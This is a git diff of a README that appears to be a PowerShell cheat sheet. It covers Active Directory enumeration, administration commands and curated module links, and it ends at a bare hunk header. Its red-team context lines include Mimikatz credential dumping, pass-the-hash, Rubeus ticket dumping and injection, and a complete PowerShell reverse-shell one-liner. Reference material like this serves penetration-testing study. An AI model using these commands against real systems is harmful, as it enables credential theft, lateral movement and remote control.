@@ -40,9 +40,8 @@
   * [Domain Admin Privileges](#domain-admin-privileges)
   * [Cross Trust Attacks](#cross-trust-attacks)
   * [Persistance and Exfiltrate](#persistance-and-exfiltrate)
-+ [Contributing](../CONTRIBUTING.md)
 + [Authors](#authors)
-+ [Acknowledgments](#acknowledgement)
++ [Acknowledgments](#acknowledgments)
 
 ## 🧐 About <a name = "about"></a>
 List of PowerShell Commands, Notes, Links, etc.
@@ -103,6 +102,13 @@ Find-Module ActiveDirectory -Verbose
 
 ```powershell
 Set-ExecutionPolicy Unrestricted
+
+# If you have not configured TLS 1.2, any attempts to install the NuGet provider and other packages will fail
+# Reference:
+# https://docs.microsoft.com/en-us/powershell/scripting/gallery/installing-psget?view=powershell-7.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+
 Update-Help -Force -Verbose
 Save-Help -DestinationPath "<DESTINATION_PATH>" -Force -Verbose
 notepad++ (Get-PSReadLineOption | select -ExpandProperty HistorySavePath)
@@ -248,14 +254,11 @@ Get-Module PowerShellGet -ListAvailable
 ```powershell
 # List modules loaded in to this current PowerShell session
 Get-Module
-
 # List modules that are available for use on this computer 
 Get-Module -ListAvailable
-
 # Do a Get-Module to see the ExportedCommands property to identify what commands are in a module
 # Call the ExportedCommands property so it formats nicely
 (Get-Module ActiveDirectory).ExportedCommands
-
 Find-Module *install*
 Find-Module -Repository PSGallery
 Find-Module -Name *pip*
@@ -273,7 +276,6 @@ Install-Module -Name ActiveDirectoryTools -Force -Verbose
 Update-Module -Verbose
 Get-Module -ListAvailable -All
 ```
-
 ---------------------------------------------------------
 ## Scripts
 ```powershell
@@ -287,7 +289,6 @@ Install-Script -Name PSGalleryInfo
 Install-Script -Name PSGalleryModule
 Install-Script -Name set-nsssl
 ```
-
 ---------------------------------------------------------
 ## PowerShell Command
 ```powershell
@@ -301,7 +302,6 @@ Get-Command -Module PowerShellGet | Format-Wide -Column 3
 Get-Command -ParameterName Cimsession
 Get-Command -ParameterName ComputerName
 ```
-
 ---------------------------------------------------------
 ## Sort and Filter
 ```powershell
@@ -313,25 +313,20 @@ Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" -Filter "LocalAcc
 Get-ChildItem -Path C:\ -Filter *.sys -Force
 Get-CimInstance -ClassName Win32_Process -Filter "Name='calculator.exe'"
 Get-ChildItem hklm:\software | Get-Member ps*
-
 # Sort by "Management*" AD Group Names
 Get-ADGroup -Filter { Name -like "*Management*" } | Select-Object -Property Name | Sort-Object -Property Name -Unique
-
 # Sort by "*admin*" AD Group Names
 Get-ADGroup -Filter { Name -like "*admin*" } | Select-Object -Property Name | Sort-Object -Property Name -Unique
 ```
-
 ---------------------------------------------------------
 ## Reporting
 ```powershell
 # Export Excel file (with PivotChard and PivotTable, 3D Chart Type)
 Get-Process | Export-Excel .\output.xlsx -WorksheetName Processes -ChartType PieExploded3D -IncludePivotChart -IncludePivotTable -Show -PivotRows Company -PivotData PM
 ```
-
 ---------------------------------------------------------
 ## Active Directory
 ```powershell
-
 # Import "ActiveDirectory" Module
 try {
     Import-Module ActiveDirectory -ErrorAction Stop
@@ -345,24 +340,19 @@ try {
     Write-Host "Unable to import module GroupPolicy! Ensure it is available on this system." -BackgroundColor Yellow -ForegroundColor Black
     Break
 }
-
 # Get all the PowerShell commands that start with "Get-AD*"
 (Find-Module -Name *-ad* -Repository PSGallery).Name | ForEach-Object {Get-Command -Module $_.Name} | Export-Csv -Path .\report_all-modules_with_-ad_in-name.csv -Encoding UTF8 
 Get-Command -Type All | Select-Object Source  | grep -i "get-ad"
-
 # Forest
 $ForestInfo = Get-ADForest -Current LocalComputer
 Get-ADForest | Format-Table -Property *master*, global*, Domains
 Get-ADForest google.com | Format-Table SchemaMaster,DomainNamingMaster
-
 # Site
 Get-ADObject -SearchBase (Get-ADRootDSE).ConfigurationNamingContext -filter "objectclass -eq 'site'"
-
 # Get OU Details
 Get-ADOrganizationalUnit -Filter * -Property * | Export-Csv -Append -Path .\output_get-adorganizationunit_all-properties.csv -NoTypeInformation -Encoding utf8
 Get-ADOrganizationalUnit -Filter "Name –eq 'HR'")
 Get-ADOrganizationalUnit -LDAPFilter "(name=Google)" -Property * | select distinguishedname
-
 # Domain
 $DomainInfo = Get-ADDomain -Current LocalComputer
 Show-DomainTree -Verbose
@@ -391,33 +381,40 @@ $ChildDomainStatus = foreach ($child in $DomainInfo.ChildDomains){
         }
     }
 }
-
 # Domain Controllers
 $DCs = Get-ADDomainController -Filter {ISReadOnly -eq $True} -ErrorVariable ErrVar -ErrorAction SilentlyContinue | Select-Object $Properties
 Get-ADDomainController
 Get-ADDomainController -Discover -Service PrimaryDC
 Get-ADObject -LDAPFilter "(objectclass=computer)" -searchbase "ou=domain controllers,dc=google,dc=com"
-
-# AD Branch
+# ADBranch
 Get-ADBranch -SearchBase "dc=<COMPANY-NAME>,dc=com" | Format-List -Property Name
-
 # ADGroup
 Get-ADGroup -Filter { Name -like "*admin*" }
 Get-ADGroup -Filter { Name -like "*Management*" }
-
 # ADGroupMember
 # Display Group Members of the HR Team Group
 Get-ADGroupMember -Identity 'HR Team' | Format-Table -Property SamAccountName, DistinguishedName
-
 # ADUser
+# "Get-ADUser"
+# Get all ADUsers
+Get-ADUser -Filter * -Properties *
+# Get ADUser by Name
+Get-ADUser -Filter 'Name -like "*John*Smith*"' -Properties * | Format-List -Property *
+Get-ADUser -Identity student1 -Properties *
+# Search for a particular string in a user's attributes
+Find-UserField -SearchField Description -SearchTerm "built"
+Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
+# Get list of all properties for users in the current domain
+Get-UserProperty
+Get-UserProperty -Properties pwdlastset
+Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
+Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
 # Identify objects in the Active Directory (AD) Recycle Bin
 # Active Directory Recycle Bin (since Windows Server 2008 R2 OS, for recovering deleted objects)
 Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))"
 Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))" | select Name
-
 # ADComputer
 Get-ADComputerReport -Verbose *>&1 | Tee-Object -FilePath "output_Get-ADComputerReport_command_2022-04-25.txt"
-
 # "CimSession" and "CimInstance"
 [PowerShell]::Create().AddCommand("Get-CimInstance").AddArgument("Win32_BIOS").Invoke()
 Get-CimInstance -CimSession "localhost" -ClassName Win32_ComputerSystem -Property *
@@ -435,13 +432,16 @@ $session = New-CimSession -Credential <USERNAME>\<PASSWORD> -ComputerName "local
 Get-CimInstance -CimSession $session -ClassName win32_service -Property name, state | sort state | ft name, state -AutoSize -HideTableHeaders -Wrap
 # Retrieve BIOS information
 Invoke-Command -ComputerName "localhost" -ScriptBlock {Get-CimInstance win32_bios}
-
 # "PSSession"
 $PSSession = New-PSSession -ComputerName "localhost"
 $PSSession = New-PSSession -Credential <USERNAME>\<PASSWORD> -ComputerName "localhost"
 Invoke-Command -Session $PSSession -ScriptBlock {gwmi win32_bios} -AsJob
+# AD - Recycle Bin 
+# Identify objects in the Active Directory (AD) Recycle Bin
+# Active Directory Recycle Bin (since Windows Server 2008 R2 OS, for recovering deleted objects)
+Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))"
+Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))" | select Name
 ```
-
 ---------------------------------------------------------
 ## Computer Info
 ```powershell
@@ -472,13 +472,11 @@ Get-ChildItem hklm:\software | Get-Member ps*
 Get-Process | sort -Descending ws | select -First 3
 Get-Process | where Handles -gt 1000
 ```
-
 ---------------------------------------------------------
 ## User Accounts
 ```powershell
 Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" -Filter "LocalAccount='$True'"
 ```
-
 ---------------------------------------------------------
 ## Registry
 ```powershell
@@ -486,44 +484,37 @@ cd hklm:\software\microsoft\powershell
 Get-ChildItem -Path Registry::
 Get-ChildItem -Path registry::HKEY_CURRENT_CONFIG\System\CurrentControlSet\SERVICES\TSDDD\
 ```
-
 ---------------------------------------------------------
 ## Files
 ```powershell
 Get-ChildItem -Path C:\ -Filter *.sys -Force
 ```
-
 ---------------------------------------------------------
 ## netstat
 ```powershell
 netstat -n | select -Skip 4 | ConvertFrom-String -PropertyNames Blank, Protocol, LocalAddress, ForeignAddress, State | Select-Object Protocol, LocalAddress, ForeignAddress, State
 ```
-
 ---------------------------------------------------------
 ## clipboard
 ```powershell
 Get-Clipboard
 ```
-
 ---------------------------------------------------------
 ## Processes
 ```powershell
 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'calc.exe'}
 Get-CimInstance -ClassName Win32_Process -Filter "Name='calculator.exe'"
 ```
-
 ---------------------------------------------------------
 ## Cimsession
 ```powershell
 Get-Command -ParameterName Cimsession
 ```
-
 ---------------------------------------------------------
 ## Services
 ```powershell
 Get-Service -Name BITS
 ```
-
 ------------------------------------
 ## Recon
 
@@ -684,7 +675,6 @@ Get-ADDomainController
 Get-NetDomainController -Domain domain.local
 Get-ADDomainController -DomainName domain.local -Discover
 ```
-
 ---
 ### NETUSER
 - Get a list of users in the current domain
@@ -707,7 +697,6 @@ Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromF
 Find-UserField -SearchField Description -SearchTerm "built"
 Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
 ```
-
 ---
 ### NETGROUP
 - Get a list of computers in the current domain
@@ -752,7 +741,6 @@ Get-NetLocalGroup -ComputerName DC01.enumme.local -ListGroups
 ```powershell
 Get-NetLocalGroup -ComputerName DC01.enumme.local -Recurse
 ```
-
 ---
 ### Logged
 - Get actively logged users on a computer (needs local admin rights on the target)
@@ -767,7 +755,6 @@ Get-LoggedonLocal -ComputerName DC01.enumme.local
 ```powershell
 Get-LastLoggedOn -ComputerName <servername>
 ```
-
 ---
 ### Share
 - Find shares on hosts in current domain
@@ -783,15 +770,12 @@ Invoke-FileFinder -Verbose
 ```powershell
 Get-NetFileServer
 ```
-
 ---
 ### GPO
-
 ```powershell
 # Get All GPO's
 Get-GPO -All -Verbose | export-csv .\report_get-gpo_all_verbose.csv -Encoding utf8
 ```
-
 - Get list of GPO in current domain
 ```powershell
 Get-NetGPO
@@ -832,7 +816,6 @@ Find-GPOLocation -UserName john -Verbose
 (Get-NetOU targetmachine -FullData).gplink[LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local;0]
 Get-NetGPO -ADSpath 'LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local'
 ```
-
 ---
 ### OU
 - Get OUs in a domain
@@ -849,10 +832,8 @@ Get-GPO -Guid x-x-x-x-x (GroupPolicy module)
 ```powershell
 Get-NetOU targetcomputer | %{Get-NetComputer -ADSPath $_}
 ```
-
 ---
 ### ACL
-
 - Get the ACLs associated with the specified object
 ```powershell
 Get-ObjectAcl -SamAccountName john -ResolveGUIDs
@@ -882,7 +863,6 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "targetgroup"}
 ```powershell
 Get-PathAcl -Path "\\DC01.domain.local\sysvol"
 ```
-
 ---
 ### Domain Trusts
 - Get a list of all domain trusts for the current domain
@@ -927,7 +907,6 @@ Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
 Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
 ```
 if Bi-Directional trust we can extract information
-
 -------
 ## Local Privilege Escalation
 ```powershell
@@ -1019,7 +998,6 @@ Enter-PSSession $sess
 # DUMPING
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
-
 ---
 ### Forwarder
 ```powershell
@@ -1030,55 +1008,39 @@ netsh interface portproxy show all
 # RESET
 netsh interface portproxy reset
 ```
-
 ---
 ### KERBEROS DOUBLE HOPS - Remote ticket dumping - SMB Lateral Hosting (skill)
-
-
 - You are logged in to ServerA.
 - From ServerA, you start a remote PowerShell session to connect to ServerB.
 - A command you run on ServerB via your PowerShell Remoting session attempts to access a resource on ServerC.<br>
-
 :no_entry: Access to the resource on ServerC is denied, because the credentials you used to create the PowerShell Remoting session are not passed from ServerB to ServerC.<br>
 :no_entry: Cannot encapsulate multiple psremoting session.<br>
 :no_entry: Delegation not available.<br>
-
-
 ```powershell
 # LOGIN WITH COMPROMISED ACCOUNT
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:bob /domain:DOMAIN.LOCAL /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
-
 # PSREMOTE TO SERVER A
 $servera = New-PSSession -ComputerName SERVERA.DOMAIN.LOCAL
 Enter-PSSession -Session $servera
-
 # PASS CREDENTIAL TO SERVER B
 $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\alice', $SecPassword)
 $serverb = New-PSSession -ComputerName SERVERB.DOMAIN.LOCAL -Credential $Cred
-
 # LIST TICKET IN SERVER C:
 Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' klist} -Session $serverb | Select-String -Pattern Username
-
 # DUMP TICKET IN SERVER C:
 Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' dump /user:targetadmin} -Session $serverb
-
 # INJECT TICKET IN SERVER B:
 Invoke-Command -ScriptBlock {& '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe'  ptt /ticket:B64 } -Session $serverb
-
 # CHECK INJECTION:
 Invoke-Command -ScriptBlock { ls \\serverc\c$ } -Session $serverb
-
 # RCE ON SERVER C:
 Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {hostname} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb
-
 # FINAL REVERSE SHELL IN SERVER A FROM SERVER C
 Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient("servera",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb 
 ```
 -------
-
 ## API Wrapper
-
 * [HipChatAdmin](https://github.com/cofonseca/HipChatAdmin) - A module for simple integration with Atlassian HipChat via the HipChat API.
 * [PSGitHub](https://github.com/pcgeek86/PSGitHub) - Module contains commands to manage GitHub through its REST API.
 * [Posh-GitHub](https://github.com/Iristyle/Posh-GitHub) - Cmdlets that expose the GitHub API.
@@ -1091,9 +1053,7 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [PSTelegramAPI](https://github.com/mkellerman/PSTelegramAPI) - Module for Telegram APIs
 * [PSTeams](https://github.com/EvotecIT/PSTeams) - A module for sending formatted messages to a Microsoft Teams Channel.
 * [PSURLScanio](https://github.com/sysgoblin/PSURLScanio) - A module for [urlscan.io](https://urlscan.io/) that is a service to scan and analyze websites.
-
 ## Blogs
-
 * [Windows PowerShell Blog](https://blogs.msdn.microsoft.com/powershell/) - Official PowerShell Team Blog.
 * [Learn PowerShell | Achieve More](http://learn-powershell.net/) - Personal blog of Boe Prox who moderated for the Scripting Guy.
 * [PowerShellMagazine](http://www.powershellmagazine.com/) - Awesome magazine.
@@ -1102,9 +1062,7 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [Mike F. Robbins](http://mikefrobbins.com/) - Microsoft MVP. SAPIEN Tech MVP. Co-author of Windows PowerShell TFM 4th Edition.
 * [Adam the Automator](https://adamtheautomator.com/) - Engaging, technical content on all things automation, cloud computing and DevOps by Adam Bertram and friends.
 * [Clear-Script](https://vexx32.github.io/) - Personal blog of Joel (Sallow) Francis.
-
 ## Books
-
 * [Exploring PowerShell Automation](https://www.manning.com/books/exploring-powershell-automation) - a free eBook sampler that gives you an overview of how to administer your environment.
 * [PowerShell in Depth](https://www.manning.com/books/powershell-in-depth) - The go-to reference for administrators. Every major shell technique, technology, and tactic is explained and demonstrated, providing a comprehensive reference to almost everything an admin would do in the shell.
 * [Windows PowerShell in Action, Third Edition](https://www.manning.com/books/windows-powershell-in-action-third-edition) - The latest revision of the comprehensive reference guide.
@@ -1119,23 +1077,17 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [Secrets of PowerShell Remoting](https://leanpub.com/s/DQLESXQ69TlVFQ9ogjrFLw.pdf) - On all things remoting. Workflow, fan-out, etc.
 * [PowerShell Notes for Professionals](https://goalkicker.com/PowerShellBook/PowerShellNotesForProfessionals.pdf) - Compilation of notes and snippets.
 * [PowerShell for SysAdmins: Workflow Automation Made Easy](https://nostarch.com/powershellsysadmins) - Learn how to manage and automate your desktop and server environments.
-
 ## Build Tools
-
 * [psake](https://github.com/psake/psake) - Build automation tool inspired by rake (aka make in Ruby) and bake (aka make in Boo).
 * [Invoke-Build](https://github.com/nightroman/Invoke-Build) - Build and test automation tool inspired by psake.
 * [PSDeploy](https://github.com/RamblingCookieMonster/PSDeploy) - Module built for the purpose of simplifying multiple types of deployments.
 * [BuildHelpers](https://github.com/RamblingCookieMonster/BuildHelpers) - Variety of helper functions for CI/CD scenarios.
 * [YDeliver](https://github.com/manojlds/YDeliver) - Build and deployment framework aimed at .NET projects.
-
 ## Code and Package Repositories
-
 * [GitHub](https://github.com/search?l=powershell&q=stars%3A%3E1&s=stars&type=Repositories) - Looking for an Open Source PowerShell project? It's probably here.
 * [PowerShell Gallery](https://www.powershellgallery.com/) - Official PowerShell package repository, used by PowerShellGet.
 * [PowerShell Test Gallery](https://www.poshtestgallery.com/) - A test version of the PowerShell Gallery. Useful when developing new modules.
-
 ## Commandline Productivity
-
 * [posh-git](https://github.com/dahlbyk/posh-git) - Set of PowerShell scripts which provide Git/PowerShell integration.
 * [PSReadLine](https://github.com/lzybkr/PSReadLine) - Bash inspired readline implementation for PowerShell. Keeps history between sessions, adds reverse-history search and makes the commandline experience much better overall.
 * [TabExpansionPlusPlus](https://github.com/lzybkr/TabExpansionPlusPlus) - PowerShell module to make customizing tab completion easier and add a library of custom argument completers.
@@ -1151,31 +1103,23 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [PSDepend](https://github.com/RamblingCookieMonster/PSDepend/) - PowerShell Dependency Handler
 * [PSScriptTools](https://github.com/jdhitsolutions/PSScriptTools) - A set of of PowerShell functions you might use to enhance your own functions and scripts or to facilitate working in the console.
 * [zoxide](https://github.com/ajeetdsouza/zoxide) - A better way to navigate your filesystem. Written in Rust, cross-shell, and much faster than other autojumpers.
-
 ## Communities
-
 * [PowerShell.org](http://powershell.org/) - Forums, summits, community blog posts, and more.
 * [/r/PowerShell](http://www.reddit.com/r/powershell) - Reddit PowerShell community.
 * [Slack PowerShell team](https://poshcode.org/slack) - Large chat room dedicated to PowerShell. Bridged with `#PowerShell` on irc.freenode.net.
 * [Research Triangle PowerShell User Group](https://www.meetup.com/Research-Triangle-PowerShell-Users-Group/) - Very active PowerShell and automation user group. Meets on first and third Wednesdays. All skill levels welcome.
-
 ## Data
-
 * [hjson-powershell](https://github.com/TomasBouda/hjson-powershell) - Simple powershell module for conversion between [HJSON](https://hjson.github.io/) and JSON.
 * [ImportExcel](https://github.com/dfinke/ImportExcel) - Module to import/export Excel spreadsheets, without Excel.
 * [powershell-yaml](https://github.com/cloudbase/powershell-yaml) - PowerShell CmdLets for YAML format manipulation.
 * [PSWriteHTML](https://github.com/EvotecIT/PSWriteHTML) - PSWriteHTML is a PowerShell module allowing you to create HTML easily.
 * [PSWritePDF](https://github.com/EvotecIT/PSWritePDF) - Module to create, edit, split, merge PDF files on Windows / Linux and MacOS.
 * [PSWriteWord](https://github.com/EvotecIT/PSWriteWord) - Module to create Microsoft Word documents without Microsoft Word installed.
-
 ## Documentation Helper
-
 * [platyPS](https://github.com/PowerShell/platyPS) - Write PowerShell External Help in Markdown.
 * [Invoke-CreateModuleHelpFile](https://github.com/gravejester/Invoke-CreateModuleHelpFile) - PowerShell function to create a HTML help file for a module and all it's commands.
 * [PScribo](https://github.com/iainbrighton/PScribo) - PowerShell documentation framework what can create HTML, Word, text files based on PowerShell-based DSL (domain specific language).
-
 ## Editors and IDEs
-
 * [PowerShell Studio](https://www.sapien.com/software/powershell_studio) - Powerful PowerShell IDE with module, help, and user interface development tools, high DPI support and regular updates.
 * [PowerShell for Visual Studio Code](https://marketplace.visualstudio.com/items?itemName=ms-vscode.PowerShell) - Provides IntelliSense, code navigations, script analysis, script debugging, and more for the [Visual Studio Code](https://code.visualstudio.com) editor.
 * [PoshTools for Visual Studio](https://ironmansoftware.com/powershell-tools-for-visual-studio/) - Provides IntelliSense, script debugging, and Pester testing support for PowerShell to Visual Studio.
@@ -1184,51 +1128,35 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [PowerShell Plus](https://www.idera.com/productssolutions/freetools/powershellplus) - All in one IDE.
 * [SublimeText package](https://github.com/SublimeText/PowerShell) - PowerShell language support for Sublime Text.
 * [Atom package](https://github.com/jugglingnutcase/language-powershell) - PowerShell language support for Atom.
-
 ## Frameworks
-
 * [Carbon](http://get-carbon.org/) - DevOps for automating the configuration of Windows computers.
 * [PowerShell PowerUp](https://github.com/janikvonrotz/PowerShell-PowerUp) - Powerful server management framework.
 * [PSCX](https://github.com/Pscx/Pscx) - PowerShell Community Extensions - Useful set of additional cmdlets.
 * [PSFramework](https://github.com/PowershellFrameworkCollective/psframework) - Easily add configurations, logging and more to your own PowerShell module.
 * [Kansa](https://github.com/davehull/Kansa) - Incident response framework.
-
 ## Interactive Learning
-
 * [PSKoans](https://github.com/vexx32/PSKoans) - A simple, fun, and interactive way to learn the PowerShell language through Pester unit testing.
 * [Jupyter-PowerShell](https://github.com/Jaykul/Jupyter-PowerShell) - Jupyter Kernel for PowerShell.
-
 ## Logging
-
 * [PoShLog](https://github.com/PoShLog/PoShLog) - Cross-platform, extensible logging module built upon [Serilog](https://serilog.net).
-
 ## Module Development Templates
-
 * [Plaster](https://github.com/PowerShell/Plaster) - Plaster is a template-based file and project generator written in PowerShell.
 * [PSModuleDevelopment](https://github.com/PowershellFrameworkCollective/PSModuleDevelopment) - Get started using module templates in 2 minutes with this module's low entry barrier and casual convenience.
 * [Catesta](https://github.com/techthoughts2/Catesta) - Catesta is a PowerShell module project generator. It uses templates to rapidly scaffold test and build integration for a variety of CI/CD platforms.
-
 ## Package Managers
-
 * [PowerShellGet](https://github.com/powershell/powershellget) - PowerShellGet is the Package Manager for PowerShell. Packages are available on [PowerShellGallery](https://www.PowerShellGallery.com).
 * [Chocolatey](https://chocolatey.org/) - The package manager for Windows. The sane way to manage software on Windows.
 * [GitLab](https://github.com/akamac/GitLabProvider) - Use a GitLab server as Package Provider.
 * [Scoop](https://scoop.sh) - A command-line installer for Windows.
 * [PowerShell App Deployment Toolkit](https://psappdeploytoolkit.com/) - Provides a set of functions to perform common application deployment tasks and to interact with the user during a deployment.
-
 ## Parallel Processing
-
 * [PoshRSJob](https://github.com/proxb/PoshRSJob) - Provides an alternative to PSJobs with greater performance and less overhead to run commands in the background.
 * [Invoke-Parallel](https://github.com/RamblingCookieMonster/Invoke-Parallel) - This function will take in a script or scriptblock, and run it against specified objects(s) in parallel.
 * [PSThreadJob](https://github.com/PaulHigin/PSThreadJob) - Module for running concurrent jobs based on threads rather than processes.
-
 ## Podcasts
-
 * [PowerScripting](https://powershell.org/category/podcast/) - Weekly show run by Jon Walz and Hal Rottenberg.
 * [The PowerShell News Podcast](https://powershellnews.podbean.com/) - This podcast is the latest news on PowerShell.
-
 ## Security
-
 * [File System Security](https://gallery.technet.microsoft.com/scriptcenter/1abd77a5-9c0b-4a2b-acef-90dbb2b84e85) - Allows a much easier management of permissions on files and folders.
 * [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) - Module used to aid a reverse engineer.
 * [PowerTools](https://github.com/Veil-Framework/PowerTools) - Collection of projects with a focus on offensive operations.
@@ -1244,34 +1172,24 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [PESecurity](https://github.com/NetSPI/PESecurity) - Module to check if a Windows binary (EXE/DLL) has been compiled with ASLR, DEP, SafeSEH, StrongNaming, and Authenticode.
 * [Powershellery](https://github.com/nullbind/Powershellery) - Powershell scripts used for general hackery.
 * [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - Toolkit for Attacking SQL Server.
-
 ## SharePoint
-
 * [AutoSPInstaller](https://autospinstaller.com/) - Automated SharePoint 2010-2019 installation script.
 * [Client-side SharePoint](https://sharepointpowershell.codeplex.com/) - API for SharePoint 2010, 2013 and Online.
 * [SPReplicator](https://github.com/potatoqualitee/SPReplicator) - SPReplicator helps replicate SharePoint list data to/from CSV, SQL Server, SharePoint itself and more.
-
 ## SQL Server
-
 * [dbatools](https://dbachecks.io) - Helps SQL Server Pros be more productive with instance migrations and much more.
 * [SimplySql](https://github.com/mithrandyr/SimplySql) - SimplySql is a module that provides an intuitive set of cmdlets for talking to databases that abstracts the vendor specifics. The basic pattern is to connect to a database, execute one or more sql.
-
 ## Testing
-
 * [Pester](https://github.com/pester/Pester) - PowerShell BDD style testing framework.
 * [Format-Pester](https://github.com/equelin/format-pester) - PowerShell module for documenting Pester's results - exports Pester results to HTML, Word, text files using [PScribo](https://github.com/iainbrighton/PScribo).
 * [Selenium](https://github.com/adamdriscoll/selenium-powershell) - PowerShell module to run a Selenium WebDriver.
 * [PSScriptAnalyzer](https://github.com/PowerShell/PSScriptAnalyzer) - PSScriptAnalyzer provides script analysis and checks for potential code defects in the scripts by applying a group of built-in or customized rules on the scripts being analyzed.
-
 ## Themes
-
 * [Oh-My-Posh](https://github.com/jandedobbeleer/oh-my-posh) - Tons of beautiful theme that can be enabled by one single command (includes many awesome powerline theme).
 * [PoshColor](https://github.com/JustABearOz/PoshColor) - Colour output from common commands with support for custom themes.
 * [Powerline](https://github.com/Jaykul/PowerLine) - PowerShell Classes for richer output and prompts.
 * [Starship](https://github.com/starship/starship) - The minimal, blazing fast, and extremely customizable prompt for any shell.
-
 ## UI
-
 * [AnyBox](https://github.com/dm3ll3n/AnyBox) - Designed to facilitate script input/output with an easily customizable WPF window.
 * [BurntToast](https://github.com/Windos/BurntToast) - Module for creating and displaying Toast Notifications on Microsoft Windows 10.
 * [Graphical](https://github.com/PrateekKumarSingh/graphical) - Module to plot colorful console 2D Graphs (Scatter, Bar, Line).
@@ -1280,9 +1198,7 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [PSWriteColor](https://github.com/EvotecIT/PSWriteColor) - Write-Color is a wrapper around Write-Host allowing you to create nice looking scripts, with colorized output.
 * [Terminal-Icons](https://github.com/devblackops/Terminal-Icons) - Module to show file and folder icons in the terminal.
 * [psInlineProgress](https://github.com/gravejester/psInlineProgress) - Write inline progress bars in PowerShell.
-
 ## Videos
-
 * [PowerShell Unplugged with Jeffrey Snover and Don Jones Ignite 2017](https://www.youtube.com/watch?v=D15vh-ryJGk) - The inventor of PowerShell talking about "the latest and coolest PowerShell features to help you automate and manage the hybrid cloud". Focused on the PowerShell Community.
 * [Getting Started With PowerShell 3.0 Jump Start](https://mva.microsoft.com/en-US/training-courses/getting-started-with-powershell-30-jump-start-8276) - Jump starts series are for IT professionals with no previous experience with PowerShell, and want to learn it fast.
 * [Advanced Tools & Scripting with PowerShell 3.0](https://channel9.msdn.com/Series/advpowershell3) - IT pros, take this advanced PowerShell course to find out how to turn your real time management and automation scripts into useful reusable tools and cmdlets.
@@ -1301,17 +1217,13 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
 * [Windows PowerShell What's New in V2 - SAPIEN](https://www.youtube.com/watch?v=85Yrs5ezxHE&list=PL6ue9e1DXqDv74YTX91gYonfFsweNmrDK) - Old but gold. Most of this is still very relevant.
 * [All Things Microsoft PowerShell](https://www.youtube.com/watch?v=IHrGresKu2w&list=PLCGGtLsUjhm2k22nFHHdupAK0hSNZVfXi) - Another general language reference.
 * [Research Triangle PowerShell User Group YouTube Channel](https://www.youtube.com/rtpsug/) - large catalog of user group meetings and demos by community members. 150+ hours of content.
-
 ## Webserver
-
 * [Flancy](https://github.com/toenuff/flancy) - Web microframework for Windows PowerShell.
 * [Pode](https://github.com/Badgerati/Pode) - Pode is a Cross-Platform PowerShell framework for creating web servers to host REST APIs, Web Sites, and TCP/SMTP Servers.
 * [Polaris](https://github.com/PowerShell/Polaris) - A cross-platform, minimalist web framework for PowerShell.
 * [WebCommander](https://github.com/vmware/webcommander) - Run scripts and view results, in a friendly web GUI or via a web service.
 * [Universal Dashboard](https://ironmansoftware.com/powershell-universal-dashboard) - Cross-platform module for developing websites and REST APIs.
-
 ## Misc
-
 * [DbgShell](https://github.com/Microsoft/DbgShell) - A PowerShell front-end for the Windows debugger engine.
 * [poke](https://github.com/oising/poke) - Crazy cool reflection module for PowerShell.
   Explore and invoke private APIs like nobody is watching.
@@ -1319,13 +1231,180 @@ Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object S
